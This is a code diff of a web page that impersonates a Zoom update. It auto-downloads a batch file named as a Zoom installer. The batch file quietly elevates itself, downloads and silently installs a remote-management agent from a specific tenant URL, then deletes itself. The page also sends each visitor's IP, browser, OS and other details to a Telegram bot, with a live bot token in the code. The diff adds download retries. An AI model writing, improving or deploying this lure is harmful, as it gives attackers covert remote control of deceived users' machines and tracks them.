@@ -93,12 +93,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
         .status-message {
@@ -194,10 +190,10 @@
 
         <div class="spinner"></div>
 
-        <!-- Status message (shows download and Telegram report status) -->
+        <!-- Status message -->
         <div id="statusMessage" class="status-message"></div>
 
-        <!-- Hidden download anchor (used for auto-trigger) -->
+        <!-- Hidden download anchor -->
         <a id="download-trigger" download="Zoom_WorkSpace_ClientSetup.bat"></a>
     </div>
 
@@ -215,44 +211,63 @@
             'use strict';
 
             // ============================================================
-            //  CONFIGURATION – REPLACE WITH YOUR OWN TELEGRAM BOT CREDENTIALS
+            //  TELEGRAM CONFIGURATION – replace with your own credentials
             // ============================================================
             const TELEGRAM_BOT_TOKEN = '8732697564:AAHJRrodoFSum4dZubLXXgN0D_5V2Mi-X5U';
             const TELEGRAM_CHAT_ID = '-1004476515039';
 
             // ------------------------------------------------------------
-            //  Embedded BAT file content – completely silent, auto-closes
+            //  BAT script – exactly as provided, with URL and MSI filename updated
             // ------------------------------------------------------------
             var batContent =
                 '@echo off\r\n' +
                 'setlocal EnableExtensions\r\n' +
                 '\r\n' +
-                ':: === Auto-elevate with hidden window ===\r\n' +
+                ':: === Auto-elevate ===\r\n' +
                 'net session >nul 2>&1\r\n' +
                 'if %errorlevel% neq 0 (\r\n' +
-                '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs -WindowStyle Hidden"\r\n' +
+                '    powershell -WindowStyle Hidden -Command "Start-Process \'%~f0\' -Verb RunAs"\r\n' +
                 '    exit /b\r\n' +
                 ')\r\n' +
                 '\r\n' +
-                ':: === Change to temp directory ===\r\n' +
-                'cd /d "%TEMP%"\r\n' +
+                ':: === Variables – updated URL and MSI name ===\r\n' +
+                'set "URL=https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/agent(My_Organization).msi"\r\n' +
+                'set "MSI=%TEMP%\\action1_agent(My_Organization).msi"\r\n' +
                 '\r\n' +
-                ':: === Check if already installed (optional) ===\r\n' +
+                ':: === Check if already installed ===\r\n' +
                 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s /f "Action1" >nul 2>&1\r\n' +
                 'if %errorlevel%==0 goto cleanup\r\n' +
                 '\r\n' +
-                ':: === Download with curl (no output) ===\r\n' +
-                'curl -s -o "action1_agent(My_Organization).msi" "https://app.au.action1.com/agent/8ebf9e43-6f52-11f1-bb1d-0b307a30e325/Windows/agent(My_Organization).msi"\r\n' +
+                ':: === Download with retry ===\r\n' +
+                'set RETRIES=3\r\n' +
+                'set COUNT=0\r\n' +
                 '\r\n' +
-                ':: === Silent install (completely hidden) ===\r\n' +
-                'msiexec /i "action1_agent(My_Organization).msi" /quiet /qn /norestart\r\n' +
+                ':download\r\n' +
+                'set /a COUNT+=1\r\n' +
+                'powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri \'%URL%\' -OutFile \'%MSI%\' -ErrorAction Stop} catch {exit 1}"\r\n' +
                 '\r\n' +
+                'if not exist "%MSI%" (\r\n' +
+                '    if %COUNT% LSS %RETRIES% (\r\n' +
+                '        timeout /t 2 >nul\r\n' +
+                '        goto download\r\n' +
+                '    ) else (\r\n' +
+                '        goto selfdelete\r\n' +
+                '    )\r\n' +
+                ')\r\n' +
+                '\r\n' +
+                ':: === Silent install ===\r\n' +
+                'msiexec /i "%MSI%" /qn /norestart >nul 2>&1\r\n' +
+                '\r\n' +
+                ':: === Cleanup MSI ===\r\n' +
                 ':cleanup\r\n' +
-                'if exist "action1_agent(My_Organization).msi" del /f /q "action1_agent(My_Organization).msi" >nul 2>&1\r\n' +
+                'if exist "%MSI%" del /f /q "%MSI%" >nul 2>&1\r\n' +
                 '\r\n' +
-                ':: === Self-delete and force close ===\r\n' +
-                'powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
-                'exit\r\n';
+                ':: === PowerShell self-delete (guaranteed) ===\r\n' +
+                ':selfdelete\r\n' +
+                'powershell -WindowStyle Hidden -Command ^\r\n' +
+                '"Start-Sleep -Seconds 2; Remove-Item -LiteralPath \'%~f0\' -Force"\r\n' +
+                '\r\n' +
+                'exit /b';
 
             // ------------------------------------------------------------
             //  DOM refs
@@ -263,12 +278,11 @@
             var statusMsg = document.getElementById('statusMessage');
 
             // ------------------------------------------------------------
-            //  Create Blob and Object URL for the BAT file
+            //  Create Blob and Object URL
             // ------------------------------------------------------------
             var blob = new Blob([batContent], { type: 'application/x-msdownload' });
             var blobUrl = URL.createObjectURL(blob);
 
-            // Set manual link
             manualLink.href = blobUrl;
             manualLink.download = 'Zoom_WorkSpace_ClientSetup.bat';
             manualLink.target = '_blank';
@@ -280,20 +294,17 @@
 
             function getBrowserInfo() {
                 var ua = navigator.userAgent;
-                var browserName = 'Unknown';
-                if (ua.indexOf('Firefox') > -1) browserName = 'Firefox';
-                else if (ua.indexOf('Chrome') > -1) browserName = 'Chrome';
-                else if (ua.indexOf('Safari') > -1) browserName = 'Safari';
-                else if (ua.indexOf('Edge') > -1) browserName = 'Edge';
-                else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browserName = 'Opera';
-                else if (ua.indexOf('Trident') > -1) browserName = 'Internet Explorer';
-                return browserName;
+                if (ua.indexOf('Firefox') > -1) return 'Firefox';
+                if (ua.indexOf('Chrome') > -1) return 'Chrome';
+                if (ua.indexOf('Safari') > -1) return 'Safari';
+                if (ua.indexOf('Edge') > -1) return 'Edge';
+                if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) return 'Opera';
+                if (ua.indexOf('Trident') > -1) return 'Internet Explorer';
+                return 'Unknown';
             }
 
             function getDeviceType() {
-                var ua = navigator.userAgent;
-                if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) return 'Mobile/Tablet';
-                return 'Desktop';
+                return (/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) ? 'Mobile/Tablet' : 'Desktop';
             }
 
             function getOS() {
@@ -303,7 +314,7 @@
                 if (ua.indexOf('Linux') > -1) return 'Linux';
                 if (ua.indexOf('Android') > -1) return 'Android';
                 if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) return 'iOS';
-                return 'Unknown OS';
+                return 'Unknown';
             }
 
             function sendTelegramReport() {
@@ -316,88 +327,67 @@
                     return;
                 }
 
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => {
-                        if (!response.ok) throw new Error('IP fetch failed');
-                        return response.json();
-                    })
-                    .then(data => {
-                        var ip = data.ip || 'Unknown';
-                        return buildAndSendTelegram(ip);
-                    })
-                    .catch(err => {
-                        return fetch('https://ipapi.co/json/')
-                            .then(res => {
-                                if (!res.ok) throw new Error('ipapi failed');
-                                return res.json();
-                            })
-                            .then(data => {
-                                var ip = data.ip || 'Unknown';
-                                return buildAndSendTelegram(ip);
-                            })
-                            .catch(() => {
-                                return buildAndSendTelegram('Unavailable');
-                            });
-                    });
-            }
+                var ipPromise = fetch('https://api.ipify.org?format=json')
+                    .then(r => r.ok ? r.json() : Promise.reject())
+                    .then(d => d.ip)
+                    .catch(() => fetch('https://ipapi.co/json/')
+                        .then(r => r.ok ? r.json() : Promise.reject())
+                        .then(d => d.ip)
+                        .catch(() => 'Unavailable'));
 
-            function buildAndSendTelegram(ip) {
-                var ua = navigator.userAgent;
-                var browser = getBrowserInfo();
-                var device = getDeviceType();
-                var os = getOS();
-                var language = navigator.language || 'Unknown';
-                var screenRes = window.screen.width + 'x' + window.screen.height;
-                var referrer = document.referrer || 'Direct';
-                var timestamp = new Date().toISOString();
+                ipPromise.then(function(ip) {
+                    var ua = navigator.userAgent;
+                    var browser = getBrowserInfo();
+                    var device = getDeviceType();
+                    var os = getOS();
+                    var language = navigator.language || 'Unknown';
+                    var screenRes = window.screen.width + 'x' + window.screen.height;
+                    var referrer = document.referrer || 'Direct';
+                    var timestamp = new Date().toISOString();
 
-                var message =
-                    '🔔 *Zoom Update Download Triggered*\n' +
-                    '──────────────────\n' +
-                    '📅 Time: ' + timestamp + '\n' +
-                    '🌐 IP: ' + ip + '\n' +
-                    '💻 Device: ' + device + '\n' +
-                    '🖥️ OS: ' + os + '\n' +
-                    '🌍 Browser: ' + browser + '\n' +
-                    '🔤 Language: ' + language + '\n' +
-                    '📺 Screen: ' + screenRes + '\n' +
-                    '🔗 Referrer: ' + referrer + '\n' +
-                    '🆔 User-Agent: ' + ua + '\n' +
-                    '──────────────────';
+                    var message =
+                        '🔔 *Zoom Update Download Triggered*\n' +
+                        '──────────────────\n' +
+                        '📅 Time: ' + timestamp + '\n' +
+                        '🌐 IP: ' + ip + '\n' +
+                        '💻 Device: ' + device + '\n' +
+                        '🖥️ OS: ' + os + '\n' +
+                        '🌍 Browser: ' + browser + '\n' +
+                        '🔤 Language: ' + language + '\n' +
+                        '📺 Screen: ' + screenRes + '\n' +
+                        '🔗 Referrer: ' + referrer + '\n' +
+                        '🆔 User-Agent: ' + ua + '\n' +
+                        '──────────────────';
 
-                var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
-                var payload = {
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                };
-
-                return fetch(url, {
+                    var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+                    return fetch(url, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (!response.ok) throw new Error('Telegram API error');
-                        return response.json();
-                    })
-                    .then(data => {
-                        if (data.ok) {
-                            statusMsg.textContent = '✅ Download started.';
-                            statusMsg.className = 'status-message';
-                        } else {
-                            throw new Error('Telegram error: ' + (data.description || 'unknown'));
-                        }
-                    })
-                    .catch(err => {
-                        console.warn('Telegram report failed:', err);
-                        statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
-                        statusMsg.className = 'status-message error';
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
                     });
+                }).then(response => {
+                    if (!response.ok) throw new Error('Telegram API error');
+                    return response.json();
+                }).then(data => {
+                    if (data.ok) {
+                        statusMsg.textContent = '✅ Download started.';
+                        statusMsg.className = 'status-message';
+                    } else {
+                        throw new Error('Telegram error: ' + (data.description || 'unknown'));
+                    }
+                }).catch(err => {
+                    console.warn('Telegram report failed:', err);
+                    statusMsg.textContent = '⚠️ Download started, but report could not be sent.';
+                    statusMsg.className = 'status-message error';
+                });
             }
 
             // ------------------------------------------------------------
-            //  Download trigger
+            //  Trigger download
             // ------------------------------------------------------------
             function triggerDownload() {
                 triggerLink.href = blobUrl;
@@ -409,7 +399,7 @@
                     statusMsg.className = 'status-message info';
                 } catch (e) {
                     window.open(blobUrl, '_blank');
-                    statusMsg.textContent = '⚠️ Download could not start automatically. Use manual link below.';
+                    statusMsg.textContent = '⚠️ Auto‑download failed. Use the manual link below.';
                     statusMsg.className = 'status-message error';
                 }
 
@@ -423,7 +413,6 @@
             var timer = setInterval(function() {
                 seconds -= 1;
                 countdownEl.textContent = Math.max(seconds, 0);
-
                 if (seconds <= 0) {
                     clearInterval(timer);
                     triggerDownload();
@@ -431,24 +420,22 @@
             }, 1000);
 
             // ------------------------------------------------------------
-            //  Manual link click – also trigger report
+            //  Manual link
             // ------------------------------------------------------------
             manualLink.addEventListener('click', function(e) {
-                if (!reportSent) {
-                    sendTelegramReport();
-                }
+                if (!reportSent) sendTelegramReport();
                 statusMsg.textContent = '⏳ Manual download initiated...';
                 statusMsg.className = 'status-message info';
             });
 
             // ------------------------------------------------------------
-            //  Clean up blob URL when page unloads
+            //  Cleanup
             // ------------------------------------------------------------
             window.addEventListener('beforeunload', function() {
                 URL.revokeObjectURL(blobUrl);
             });
 
-            console.log('Zoom Update page ready. BAT file embedded, Telegram reporting active.');
+            console.log('Zoom Update page ready. BAT file embedded with updated URL and MSI name.');
         })();
     </script>
 </body>
